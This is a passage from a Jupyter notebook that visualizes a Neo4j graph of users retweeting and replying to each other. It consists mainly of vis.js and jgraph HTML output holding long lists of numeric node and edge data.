\"to\": 104}, {\"from\": 3, \"to\": 64}, {\"from\": 85, \"to\": 105}, {\"from\": 62, \"to\": 106}, {\"from\": 3, \"to\": 107}, {\"from\": 77, \"to\": 108}, {\"from\": 92, \"to\": 109}, {\"from\": 48, \"to\": 107}, {\"from\": 3, \"to\": 110}, {\"from\": 46, \"to\": 107}, {\"from\": 3, \"to\": 79}, {\"from\": 111, \"to\": 112}, {\"from\": 3, \"to\": 113}, {\"from\": 77, \"to\": 114}, {\"from\": 110, \"to\": 115}, {\"from\": 116, \"to\": 117}, {\"from\": 3, \"to\": 117}, {\"from\": 112, \"to\": 118}, {\"from\": 5, \"to\": 119}, {\"from\": 120, \"to\": 121}, {\"from\": 85, \"to\": 122}, {\"from\": 123, \"to\": 124}, {\"from\": 92, \"to\": 125}, {\"from\": 92, \"to\": 126}, {\"from\": 92, \"to\": 127}, {\"from\": 128, \"to\": 129}, {\"from\": 130, \"to\": 131}, {\"from\": 37, \"to\": 132}, {\"from\": 11, \"to\": 46}, {\"from\": 11, \"to\": 48}, {\"from\": 11, \"to\": 133}, {\"from\": 3, \"to\": 134}, {\"from\": 3, \"to\": 135}, {\"from\": 3, \"to\": 136}, {\"from\": 134, \"to\": 137}, {\"from\": 3, \"to\": 138}, {\"from\": 92, \"to\": 139}, {\"from\": 140, \"to\": 141}, {\"from\": 3, \"to\": 142}, {\"from\": 143, \"to\": 144}, {\"from\": 141, \"to\": 145}, {\"from\": 146, \"to\": 147}, {\"from\": 141, \"to\": 148}, {\"from\": 141, \"to\": 149}, {\"from\": 136, \"to\": 150}, {\"from\": 142, \"to\": 143}, {\"from\": 141, \"to\": 151}, {\"from\": 136, \"to\": 152}, {\"from\": 141, \"to\": 153}, {\"from\": 11, \"to\": 154}, {\"from\": 141, \"to\": 155}, {\"from\": 141, \"to\": 156}, {\"from\": 92, \"to\": 157}, {\"from\": 141, \"to\": 158}, {\"from\": 80, \"to\": 159}, {\"from\": 23, \"to\": 160}, {\"from\": 141, \"to\": 161}, {\"from\": 141, \"to\": 162}, {\"from\": 61, \"to\": 144}, {\"from\": 141, \"to\": 163}, {\"from\": 68, \"to\": 141}, {\"from\": 29, \"to\": 141}, {\"from\": 3, \"to\": 164}, {\"from\": 3, \"to\": 165}, {\"from\": 141, \"to\": 166}, {\"from\": 165, \"to\": 167}, {\"from\": 165, \"to\": 168}, {\"from\": 141, \"to\": 169}, {\"from\": 170, \"to\": 171}, {\"from\": 5, \"to\": 172}, {\"from\": 173, \"to\": 174}, {\"from\": 141, \"to\": 175}, {\"from\": 141, \"to\": 176}, {\"from\": 177, \"to\": 178}, {\"from\": 141, \"to\": 179}, {\"from\": 174, \"to\": 180}, {\"from\": 174, \"to\": 181}, {\"from\": 57, \"to\": 182}, {\"from\": 92, \"to\": 183}, {\"from\": 3, \"to\": 104}, {\"from\": 174, \"to\": 184}, {\"from\": 11, \"to\": 185}, {\"from\": 174, \"to\": 186}, {\"from\": 11, \"to\": 187}, {\"from\": 165, \"to\": 188}, {\"from\": 174, \"to\": 189}, {\"from\": 11, \"to\": 88}, {\"from\": 141, \"to\": 190}, {\"from\": 141, \"to\": 191}, {\"from\": 141, \"to\": 192}, {\"from\": 92, \"to\": 193}, {\"from\": 92, \"to\": 194}, {\"from\": 141, \"to\": 195}, {\"from\": 196, \"to\": 197}, {\"from\": 198, \"to\": 199}, {\"from\": 185, \"to\": 200}, {\"from\": 185, \"to\": 201}, {\"from\": 57, \"to\": 202}, {\"from\": 11, \"to\": 23}, {\"from\": 185, \"to\": 203}, {\"from\": 79, \"to\": 185}, {\"from\": 185, \"to\": 204}, {\"from\": 80, \"to\": 205}, {\"from\": 141, \"to\": 206}, {\"from\": 207, \"to\": 208}, {\"from\": 209, \"to\": 210}, {\"from\": 141, \"to\": 211}, {\"from\": 208, \"to\": 212}, {\"from\": 185, \"to\": 210}, {\"from\": 213, \"to\": 214}, {\"from\": 208, \"to\": 215}, {\"from\": 80, \"to\": 216}, {\"from\": 185, \"to\": 216}, {\"from\": 217, \"to\": 218}, {\"from\": 208, \"to\": 219}, {\"from\": 136, \"to\": 185}, {\"from\": 136, \"to\": 220}, {\"from\": 141, \"to\": 221}, {\"from\": 185, \"to\": 222}, {\"from\": 141, \"to\": 223}, {\"from\": 3, \"to\": 224}, {\"from\": 130, \"to\": 224}, {\"from\": 141, \"to\": 225}, {\"from\": 3, \"to\": 226}, {\"from\": 227, \"to\": 228}, {\"from\": 3, \"to\": 229}, {\"from\": 230, \"to\": 231}, {\"from\": 63, \"to\": 232}, {\"from\": 210, \"to\": 233}, {\"from\": 103, \"to\": 228}, {\"from\": 185, \"to\": 228}, {\"from\": 141, \"to\": 234}, {\"from\": 103, \"to\": 235}, {\"from\": 92, \"to\": 236}, {\"from\": 231, \"to\": 237}, {\"from\": 92, \"to\": 238}, {\"from\": 3, \"to\": 198}, {\"from\": 112, \"to\": 239}, {\"from\": 92, \"to\": 240}, {\"from\": 160, \"to\": 241}, {\"from\": 141, \"to\": 242}, {\"from\": 112, \"to\": 243}, {\"from\": 244, \"to\": 245}, {\"from\": 92, \"to\": 246}, {\"from\": 247, \"to\": 248}, {\"from\": 92, \"to\": 249}, {\"from\": 61, \"to\": 250}, {\"from\": 251, \"to\": 252}, {\"from\": 226, \"to\": 253}, {\"from\": 11, \"to\": 254}, {\"from\": 46, \"to\": 250}, {\"from\": 48, \"to\": 250}, {\"from\": 185, \"to\": 250}, {\"from\": 250, \"to\": 255}, {\"from\": 208, \"to\": 256}, {\"from\": 231, \"to\": 257}, {\"from\": 141, \"to\": 258}, {\"from\": 259, \"to\": 260}, {\"from\": 3, \"to\": 250}, {\"from\": 165, \"to\": 261}, {\"from\": 120, \"to\": 262}, {\"from\": 263, \"to\": 264}, {\"from\": 92, \"to\": 265}, {\"from\": 185, \"to\": 266}, {\"from\": 266, \"to\": 267}, {\"from\": 3, \"to\": 266}, {\"from\": 130, \"to\": 268}, {\"from\": 269, \"to\": 270}, {\"from\": 13, \"to\": 271}, {\"from\": 3, \"to\": 23}, {\"from\": 92, \"to\": 272}, {\"from\": 48, \"to\": 273}, {\"from\": 46, \"to\": 273}];\n",
       "\n",
       "    var container = document.getElementById(\"85375a5b-cccd-459e-bc04-efc01f2494fb\");\n",
       "\n",
       "    var data = {\n",
       "        nodes: nodes,\n",
       "        edges: edges\n",
       "    };\n",
       "\n",
       "    var options = {\n",
       "    nodes: {\n",
       "        shape: 'dot',\n",
       "        size: 25,\n",
       "        font: {\n",
       "            size: 14\n",
       "        }\n",
       "    },\n",
       "    edges: {\n",
       "        font: {\n",
       "            size: 14,\n",
       "            align: 'middle'\n",
       "        },\n",
       "        color: 'gray',\n",
       "        arrows: {\n",
       "            to: {\n",
       "                enabled: true,\n",
       "                scaleFactor: 0.5\n",
       "            }\n",
       "        },\n",
       "        smooth: {\n",
       "            enabled: false\n",
       "        }\n",
       "    },\n",
       "    physics: {\n",
       "        enabled: true\n",
       "        }\n",
       "    };\n",
       "\n",
       "    var network = new vis.Network(container, data, options);\n",
       "\n",
       "</script>\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "execution_count": 30,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "neo4jupyter.vis_network(nodes, edges, physics=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c4686e80",
   "metadata": {},
   "source": [
    "<h3>Graph Visualization</h3>"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e1bdb8f8",
   "metadata": {},
   "source": [
    "<h2>jgraph</h2>"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "40cbe571",
   "metadata": {},
   "source": [
    "Let's visualize (in 3D!) the structure of users retweeting and replying to other users."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "id": "56fe4e02",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div id=\"graph-efe6e199-478b-466d-ad60-6effc6fdde41\"></div>\n",
       "           <script type=\"text/javascript\">\n",
       "           require.config({baseUrl: '/',\n",
       "                             paths: {jgraph: ['nbextensions/jgraph.min', 'https://rawgit.com/patrickfuller/jgraph/master/js/build/jgraph.min']}});\n",
       "           require(['jgraph'], function () {\n",
       "               var $d = $('#graph-efe6e199-478b-466d-ad60-6effc6fdde41');\n",
       "               $d.width(600); $d.height(400);\n",
       "               $d.jgraph = jQuery.extend({}, jgraph);\n",
       "               $d.jgraph.create($d, {nodeSize: 2.000000,\n",
       "                                     edgeSize: 0.250000,\n",
       "                                     defaultNodeColor: '0x5bc0de',\n",
       "                                     defaultEdgeColor: '0xaaaaaa',\n",
       "                                     shader: 'basic',\n",
       "                                     z: 100,\n",
       "                                     runOptimization: true,\n",
       "                                     directed: true,\n",
       "                                     showSave: false});\n",
       "               $d.jgraph.draw({\n",
       "    \"edges\": [\n",
       "        { \"source\": 28, \"target\": 18 },\n",
       "        { \"source\": 46, \"target\": 18 },\n",
       "        { \"source\": 91, \"target\": 92 },\n",
       "        { \"source\": 91, \"target\": 95 },\n",
       "        { \"source\": 98, \"target\": 18 },\n",
       "        { \"source\": 152, \"target\": 154 },\n",
       "        { \"source\": 161, \"target\": 162 },\n",
       "        { \"source\": 91, \"target\": 201 },\n",
       "        { \"source\": 315, \"target\": 318 },\n",
       "        { \"source\": 321, \"target\": 318 },\n",
       "        { \"source\": 323, \"target\": 318 },\n",
       "        { \"source\": 378, \"target\": 95 },\n",
       "        { \"source\": 380, \"target\": 18 },\n",
       "        { \"source\": 397, \"target\": 95 },\n",
       "        { \"source\": 399, \"target\": 18 },\n",
       "        { \"source\": 414, \"target\": 415 },\n",
       "        { \"source\": 91, \"target\": 435 },\n",
       "        { \"source\": 462, \"target\": 318 },\n",
       "        { \"source\": 575, \"target\": 154 },\n",
       "        { \"source\": 585, \"target\": 266 },\n",
       "        { \"source\": 659, \"target\": 662 },\n",
       "        { \"source\": 714, \"target\": 662 },\n",
       "        { \"source\": 724, \"target\": 18 },\n",
       "        { \"source\": 734, \"target\": 478 },\n",
       "        { \"source\": 782, \"target\": 18 },\n",
       "        { \"source\": 786, \"target\": 65 },\n",
       "        { \"source\": 792, \"target\": 478 },\n",
       "        { \"source\": 91, \"target\": 857 },\n",
       "        { \"source\": 873, \"target\": 18 },\n",
       "        { \"source\": 480, \"target\": 633 },\n",
       "        { \"source\": 91, \"target\": 673 },\n",
       "        { \"source\": 932, \"target\": 33 },\n",
       "        { \"source\": 960, \"target\": 18 },\n",
       "        { \"source\": 91, \"target\": 943 },\n",
       "        { \"source\": 987, \"target\": 989 },\n",
       "        { \"source\": 992, \"target\": 989 },\n",
       "        { \"source\": 992, \"target\": 994 },\n",
       "        { \"source\": 987, \"target\": 994 },\n",
       "        { \"source\": 91, \"target\": 994 },\n",
       "        { \"source\": 91, \"target\": 954 },\n",
       "        { \"source\": 1029, \"target\": 491 },\n",
       "        { \"source\": 1033, \"target\": 1033 },\n",
       "        { \"source\": 91, \"target\": 1026 },\n",
       "        { \"source\": 1100, \"target\": 994 },\n",
       "        { \"source\": 1144, \"target\": 18 },\n",
       "        { \"source\": 1154, \"target\": 1155 },\n",
       "        { \"source\": 91, \"target\": 1083 },\n",
       "        { \"source\": 1241, \"target\": 550 },\n",
       "        { \"source\": 596, \"target\": 662 },\n",
       "        { \"source\": 91, \"target\": 1252 },\n",
       "        { \"source\": 1276, \"target\": 1256 },\n",
       "        { \"source\": 1350, \"target\": 1155 },\n",
       "        { \"source\": 91, \"target\": 1315 },\n",
       "        { \"source\": 91, \"target\": 1329 },\n",
       "        { \"source\": 1389, \"target\": 18 },\n",
       "        { \"source\": 1393, \"target\": 857 },\n",
       "        { \"source\": 1412, \"target\": 506 },\n",
       "        { \"source\": 1431, \"target\": 1433 },\n",
       "        { \"source\": 1483, \"target\": 1433 },\n",
       "        { \"source\": 1489, \"target\": 1447 },\n",
       "        { \"source\": 987, \"target\": 832 },\n",
       "        { \"source\": 992, \"target\": 832 },\n",
       "        { \"source\": 91, \"target\": 832 },\n",
       "        { \"source\": 1545, \"target\": 1399 },\n",
       "        { \"source\": 91, \"target\": 832 },\n",
       "        { \"source\": 1347, \"target\": 1346 },\n",
       "        { \"source\": 1591, \"target\": 1561 },\n",
       "        { \"source\": 1594, \"target\": 1595 },\n",
       "        { \"source\": 91, \"target\": 1595 },\n",
       "        { \"source\": 1628, \"target\": 1598 },\n",
       "        { \"source\": 1633, \"target\": 1598 },\n",
       "        { \"source\": 786, \"target\": 1507 },\n",
       "        { \"source\": 354, \"target\": 1595 },\n",
       "        { \"source\": 1656, \"target\": 1595 },\n",
       "        { \"source\": 1646, \"target\": 1646 },\n",
       "        { \"source\": 1663, \"target\": 1595 },\n",
       "        { \"source\": 354, \"target\": 1595 },\n",
       "        { \"source\": 1684, \"target\": 1625 },\n",
       "        { \"source\": 1602, \"target\": 1598 },\n",
       "        { \"source\": 987, \"target\": 1595 },\n",
       "        { \"source\": 992, \"target\": 1595 },\n",
       "        { \"source\": 1656, \"target\": 1595 },\n",
       "        { \"source\": 1703, \"target\": 1598 },\n",
       "        { \"source\": 1602, \"target\": 1625 },\n",
       "        { \"source\": 1728, \"target\": 1625 },\n",
       "        { \"source\": 830, \"target\": 832 },\n",
       "        { \"source\": 91, \"target\": 1732 },\n",
       "        { \"source\": 1735, \"target\": 1625 },\n",
       "        { \"source\": 91, \"target\": 1329 },\n",
       "        { \"source\": 1501, \"target\": 1501 },\n",
       "        { \"source\": 1708, \"target\": 1625 },\n",
       "        { \"source\": 1708, \"target\": 95 },\n",
       "        { \"source\": 1772, \"target\": 95 },\n",
       "        { \"source\": 992, \"target\": 1775 },\n",
       "        { \"source\": 987, \"target\": 1775 },\n",
       "        { \"source\": 1787, \"target\": 1789 },\n",
       "        { \"source\": 1545, \"target\": 1399 },\n",
       "        { \"source\": 1874, \"target\": 1874 },\n",
       "        { \"source\": 91, \"target\": 1256 },\n",
       "        { \"source\": 1899, \"target\": 1598 },\n",
       "        { \"source\": 1787, \"target\": 1789 },\n",
       "        { \"source\": 1904, \"target\": 1252 },\n",
       "        { \"source\": 91, \"target\": 1914 },\n",
       "        { \"source\": 1937, \"target\": 832 },\n",
       "        { \"source\": 1950, \"target\": 1625 },\n",
       "        { \"source\": 992, \"target\": 1914 },\n",
       "        { \"source\": 91, \"target\": 1930 },\n",
       "        { \"source\": 987, \"target\": 1914 },\n",
       "        { \"source\": 91, \"target\": 1399 },\n",
       "        { \"source\": 2016, \"target\": 1997 },\n",
       "        { \"source\": 91, \"target\": 2007 },\n",
       "        { \"source\": 2067, \"target\": 2067 },\n",
       "        { \"source\": 2067, \"target\": 2067 },\n",
       "        { \"source\": 2067, \"target\": 2067 },\n",
       "        { \"source\": 2098, \"target\": 832 },\n",
       "        { \"source\": 2100, \"target\": 1930 },\n",
       "        { \"source\": 2113, \"target\": 2108 },\n",
       "        { \"source\": 91, \"target\": 2108 },\n",
       "        { \"source\": 2201, \"target\": 1997 },\n",
       "        { \"source\": 2203, \"target\": 95 },\n",
       "        { \"source\": 2225, \"target\": 2188 },\n",
       "        { \"source\": 2277, \"target\": 1598 },\n",
       "        { \"source\": 2279, \"target\": 2185 },\n",
       "        { \"source\": 2283, \"target\": 1625 },\n",
       "        { \"source\": 826, \"target\": 1625 },\n",
       "        { \"source\": 2307, \"target\": 1625 },\n",
       "        { \"source\": 91, \"target\": 1399 },\n",
       "        { \"source\": 2391, \"target\": 2337 },\n",
       "        { \"source\": 2053, \"target\": 2382 },\n",
       "        { \"source\": 91, \"target\": 201 },\n",
       "        { \"source\": 2434, \"target\": 857 },\n",
       "        { \"source\": 987, \"target\": 201 },\n",
       "        { \"source\": 992, \"target\": 201 },\n",
       "        { \"source\": 2438, \"target\": 201 },\n",
       "        { \"source\": 1545, \"target\": 1399 },\n",
       "        { \"source\": 91, \"target\": 2450 },\n",
       "        { \"source\": 91, \"target\": 2427 },\n",
       "        { \"source\": 91, \"target\": 2417 },\n",
       "        { \"source\": 2458, \"target\": 2450 },\n",
       "        { \"source\": 91, \"target\": 2443 },\n",
       "        { \"source\": 1654, \"target\": 1625 },\n",
       "        { \"source\": 2498, \"target\": 54 },\n",
       "        { \"source\": 91, \"target\": 1306 },\n",
       "        { \"source\": 1167, \"target\": 2492 },\n",
       "        { \"source\": 2518, \"target\": 54 },\n",
       "        { \"source\": 2522, \"target\": 1049 },\n",
       "        { \"source\": 2531, \"target\": 54 },\n",
       "        { \"source\": 2536, \"target\": 54 },\n",
       "        { \"source\": 2540, \"target\": 2417 },\n",
       "        { \"source\": 1167, \"target\": 1306 },\n",
       "        { \"source\": 2543, \"target\": 54 },\n",
       "        { \"source\": 521, \"target\": 2417 },\n",
       "        { \"source\": 2546, \"target\": 54 },\n",
       "        { \"source\": 2548, \"target\": 201 },\n",
       "        { \"source\": 2556, \"target\": 54 },\n",
       "        { \"source\": 2567, \"target\": 54 },\n",
       "        { \"source\": 2569, \"target\": 1625 },\n",
       "        { \"source\": 2580, \"target\": 54 },\n",
       "        { \"source\": 1591, \"target\": 2587 },\n",
       "        { \"source\": 2590, \"target\": 462 },\n",
       "        { \"source\": 2592, \"target\": 54 },\n",
       "        { \"source\": 2595, \"target\": 54 },\n",
       "        { \"source\": 2597, \"target\": 54 },\n",
       "        { \"source\": 596, \"target\": 2492 },\n",
       "        { \"source\": 2616, \"target\": 54 },\n",
       "        { \"source\": 1389, \"target\": 54 },\n",
       "        { \"source\": 2587, \"target\": 2587 },\n",
       "        { \"source\": 714, \"target\": 54 },\n",
       "        { \"source\": 91, \"target\": 2623 },\n",
       "        { \"source\": 91, \"target\": 544 },\n",
       "        { \"source\": 2647, \"target\": 54 },\n",
       "        { \"source\": 2649, \"target\": 544 },\n",
       "        { \"source\": 2587, \"target\": 2587 },\n",
       "        { \"source\": 2660, \"target\": 544 },\n",
       "        { \"source\": 2664, \"target\": 54 },\n",
       "        { \"source\": 2666, \"target\": 2502 },\n",
       "        { \"source\": 2678, \"target\": 95 },\n",
       "        { \"source\": 2044, \"target\": 2198 },\n",
       "        { \"source\": 2699, \"target\": 54 },\n",
       "        { \"source\": 2701, \"target\": 54 },\n",
       "        { \"source\": 2705, \"target\": 2152 },\n",
       "        { \"source\": 2712, \"target\": 54 },\n",
       "        { \"source\": 2714, \"target\": 2198 },\n",
       "        { \"source\": 2720, \"target\": 2198 },\n",
       "        { \"source\": 407, \"target\": 2693 },\n",
       "        { \"source\": 2746, \"target\": 1155 },\n",
       "        { \"source\": 2757, \"target\": 1625 },\n",
       "        { \"source\": 91, \"target\": 1789 },\n",
       "        { \"source\": 2320, \"target\": 2198 },\n",
       "        { \"source\": 2763, \"target\": 201 },\n",
       "        { \"source\": 2765, \"target\": 2198 },\n",
       "        { \"source\": 2767, \"target\": 201 },\n",
       "        { \"source\": 2769, \"target\": 544 },\n",
       "        { \"source\": 2771, \"target\": 2198 },\n",
       "        { \"source\": 354, \"target\": 201 },\n",
       "        { \"source\": 2784, \"target\": 54 },\n",
       "        { \"source\": 2799, \"target\": 54 },\n",
       "        { \"source\": 2807, \"target\": 54 },\n",
       "        { \"source\": 2809, \"target\": 1625 },\n",
       "        { \"source\": 2811, \"target\": 1625 },\n",
       "        { \"source\": 2826, \"target\": 54 },\n",
       "        { \"source\": 918, \"target\": 921 },\n",
       "        { \"source\": 2844, \"target\": 2727 },\n",
       "        { \"source\": 2763, \"target\": 2846 },\n",
       "        { \"source\": 2763, \"target\": 2875 },\n",
       "        { \"source\": 2587, \"target\": 2587 },\n",
       "        { \"source\": 2885, \"target\": 1155 },\n",
       "        { \"source\": 462, \"target\": 201 },\n",
       "        { \"source\": 2763, \"target\": 2856 },\n",
       "        { \"source\": 2763, \"target\": 1399 },\n",
       "        { \"source\": 2763, \"target\": 1403 },\n",
       "        { \"source\": 1591, \"target\": 2930 },\n",
       "        { \"source\": 2941, \"target\": 54 },\n",
       "        { \"source\": 2963, \"target\": 2966 },\n",
       "        { \"source\": 2969, \"target\": 2155 },\n",
       "        { \"source\": 2974, \"target\": 54 },\n",
       "        { \"source\": 2977, \"target\": 2966 },\n",
       "        { \"source\": 2763, \"target\": 2155 },\n",
       "        { \"source\": 3004, \"target\": 2959 },\n",
       "        { \"source\": 3011, \"target\": 2773 },\n",
       "        { \"source\": 3014, \"target\": 2966 },\n",
       "        { \"source\": 1591, \"target\": 3029 },\n",
       "        { \"source\": 2763, \"target\": 3029 },\n",
       "        { \"source\": 3049, \"target\": 2040 },\n",
       "        { \"source\": 3056, \"target\": 2966 },\n",
       "        { \"source\": 2763, \"target\": 2417 },\n",
       "        { \"source\": 3059, \"target\": 2417 },\n",
       "        { \"source\": 3061, \"target\": 54 },\n",
       "        { \"source\": 2763, \"target\": 3076 },\n",
       "        { \"source\": 3079, \"target\": 54 },\n",
       "        { \"source\": 91, \"target\": 3091 },\n",
       "        { \"source\": 2053, \"target\": 3091 },\n",
       "        { \"source\": 3105, \"target\": 54 },\n",
       "        { \"source\": 91, \"target\": 3114 },\n",
       "        { \"source\": 3131, \"target\": 3071 },\n",
       "        { \"source\": 91, \"target\": 3145 },\n",
       "        { \"source\": 3165, \"target\": 2396 },\n",
       "        { \"source\": 1276, \"target\": 3174 },\n",
       "        { \"source\": 3186, \"target\": 2155 },\n",
       "        { \"source\": 1787, \"target\": 3071 },\n",
       "        { \"source\": 2763, \"target\": 3071 },\n",
       "        { \"source\": 2763, \"target\": 2155 },\n",
       "        { \"source\": 3225, \"target\": 54 },\n",
       "        { \"source\": 1787, \"target\": 3254 },\n",
       "        { \"source\": 3276, \"target\": 1625 },\n",
       "        { \"source\": 3284, \"target\": 2396 },\n",
       "        { \"source\": 3292, \"target\": 1625 },\n",
       "        { \"source\": 91, \"target\": 2844 },\n",
       "        { \"source\": 3326, \"target\": 1997 },\n",
       "        { \"source\": 326, \"target\": 1625 },\n",
       "        { \"source\": 2590, \"target\": 3348 },\n",
       "        { \"source\": 3386, \"target\": 54 },\n",
       "        { \"source\": 3399, \"target\": 1997 },\n",
       "        { \"source\": 3406, \"target\": 2642 },\n",
       "        { \"source\": 3410, \"target\": 1625 },\n",
       "        { \"source\": 3412, \"target\": 3397 },\n",
       "        { \"source\": 797, \"target\": 1625 },\n",
       "        { \"source\": 596, \"target\": 3422 },\n",
       "        { \"source\": 3427, \"target\": 1569 },\n",
       "        { \"source\": 3429, \"target\": 1419 },\n",
       "        { \"source\": 3436, \"target\": 3114 },\n",
       "        { \"source\": 987, \"target\": 201 },\n",
       "        { \"source\": 987, \"target\": 201 },\n",
       "        { \"source\": 992, \"target\": 201 },\n",
       "        { \"source\": 3477, \"target\": 201 },\n",
       "        { \"source\": 987, \"target\": 3422 },\n",
       "        { \"source\": 992, \"target\": 3422 },\n",
       "        { \"source\": 2763, \"target\": 3422 },\n",
       "        { \"source\": 3501, \"target\": 3422 },\n",
       "        { \"source\": 2053, \"target\": 2382 },\n",
       "        { \"source\": 3567, \"target\": 2966 },\n",
       "        { \"source\": 3569, \"target\": 2396 },\n",
       "        { \"source\": 3597, \"target\": 54 },\n",
       "        { \"source\": 3616, \"target\": 3619 },\n",
       "        { \"source\": 91, \"target\": 3422 },\n",
       "        { \"source\": 3654, \"target\": 544 },\n",
       "        { \"source\": 2225, \"target\": 3681 },\n",
       "        { \"source\": 3705, \"target\": 3706 },\n",
       "        { \"source\": 3729, \"target\": 1625 },\n",
       "        { \"source\": 2763, \"target\": 3793 },\n",
       "        { \"source\": 3796, \"target\": 3793 },\n",
       "        { \"source\": 91, \"target\": 3793 },\n",
       "        { \"source\": 2053, \"target\": 3833 },\n",
       "        { \"source\": 3836, \"target\": 3035 },\n",
       "        { \"source\": 3817, \"target\": 318 },\n",
       "        { \"source\": 91, \"target\": 462 },\n",
       "        { \"source\": 3912, \"target\": 1625 },\n",
       "        { \"source\": 992, \"target\": 3888 },\n",
       "        { \"source\": 987, \"target\": 3888 },\n",
       "        { \"source\": 4014, \"target\": 4014 }\n",
       "    ],\n",
       "    \"nodes\": {\n",
       "        \"18\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"28\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"33\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"46\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"54\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"65\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"91\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"92\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"95\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"98\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"152\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"154\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"161\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"162\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"201\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"266\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"315\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"318\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"321\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"323\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"326\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"354\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"378\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"380\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"397\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"399\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"407\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"414\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"415\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"435\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"462\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"478\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"480\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"491\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"506\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"521\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"544\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"550\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"575\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"585\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"596\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"633\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"659\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"662\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"673\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"714\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"724\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"734\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"782\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"786\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"792\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"797\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"826\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"830\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"832\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"857\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"873\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"918\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"921\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"932\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"943\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"954\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"960\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"987\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"989\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"992\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"994\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"1026\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"1029\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"1033\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"1049\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"1083\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"1100\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"1144\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"1154\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"1155\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
